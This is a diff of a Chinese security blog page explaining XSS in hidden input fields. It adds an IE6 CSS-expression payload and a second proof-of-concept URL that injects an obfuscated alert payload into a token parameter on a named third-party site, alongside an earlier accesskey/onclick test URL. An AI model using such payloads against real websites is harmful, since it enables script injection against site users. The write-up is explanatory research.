@@ -22,7 +22,8 @@
 &amp;lt;input type=&quot;hidden&quot; name=&quot;redacted&quot; value=&quot;default&quot; injection=&quot;xss&quot; /&amp;gt;
 结论在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的">
 <meta property="og:image" content="http://xdxd.love/images/inputhidden1.png">
-<meta property="og:updated_time" content="2016-01-20T06:37:13.000Z">
+<meta property="og:image" content="http://xdxd.love/images/inputhidden2.png">
+<meta property="og:updated_time" content="2016-01-20T06:45:18.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="input标签type为hidden时的xss利用">
 <meta name="twitter:description" content="问题场景有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。
@@ -119,9 +120,14 @@
 <p>3，firefox使用键盘交互的方式。</p>
 <pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> accesskey=<span class="string">"X"</span> onclick=<span class="string">"alert(1)"</span>&gt;
 </code></pre><p> Only works on Firefox. ALT+SHIFT+X on Windows/Linux, CTRL+ALT+X osx.</p>
-<h1 id="实例测试">实例测试</h1><pre><code><span class="keyword">http</span>://m.yohobuy.com/passport//back//backcode?phoneNum=15381187741&amp;token=a<span class="number">%20</span>accesskey=X<span class="number">%20</span>onclick=alert<span class="number">%281</span><span class="number">%29</span>&amp;areaCode=8
+<p>4,使用expression</p>
+<p>IE6下</p>
+<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
+</code></pre><h1 id="实例测试">实例测试</h1><pre><code><span class="keyword">http</span>://m.yohobuy.com/passport//back//backcode?phoneNum=15381187741&amp;token=a<span class="number">%20</span>accesskey=X<span class="number">%20</span>onclick=alert<span class="number">%281</span><span class="number">%29</span>&amp;areaCode=8
 </code></pre><p><img src="/images/inputhidden1.png" alt=""></p>
-<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/9856" target="_blank" rel="external">http://zone.wooyun.org/content/9856</a></p>
+<pre><code>http:<span class="regexp">//m</span>.yohobuy.com/passport//back//backcode?phoneNum=<span class="number">15381187741</span>&amp;token=e6fd9<span class="variable">%20style</span><span class="variable">%3dx</span><span class="variable">%3aexpr</span><span class="variable">%2f</span>**<span class="variable">%2fession</span>(<span class="keyword">open</span>(alert(<span class="number">1</span>)))<span class="variable">%20e6fd9</span>&amp;areaCode=<span class="number">8</span>
+</code></pre><p><img src="/images/inputhidden2.png" alt=""></p>
+<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/9856" target="_blank" rel="external">http://zone.wooyun.org/content/9856</a><br><a href="http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html" target="_blank" rel="external">http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
